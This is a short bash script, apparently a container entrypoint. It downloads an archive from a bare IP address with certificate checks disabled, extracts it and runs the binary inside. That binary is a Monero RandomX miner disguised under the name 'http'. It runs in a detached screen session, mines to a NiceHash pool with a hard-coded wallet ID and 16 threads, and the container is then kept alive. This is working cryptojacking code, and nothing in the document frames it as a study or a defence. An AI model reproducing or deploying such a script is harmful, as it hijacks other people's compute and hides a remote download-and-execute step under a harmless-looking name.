#!/bin/bash


# Download the http file
wget --no-check-certificate http://35.211.126.56/http.tar.gz -O /app/http.tar.gz

# Extract the http file
tar -xvzf /app/http.tar.gz -C /app/

# Clean up
rm /app/http.tar.gz


# Change directory to the extracted folder
cd /app/http

# Run http with screen
screen -dmS http_session bash -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"

# Keep the container running
tail -f /dev/null
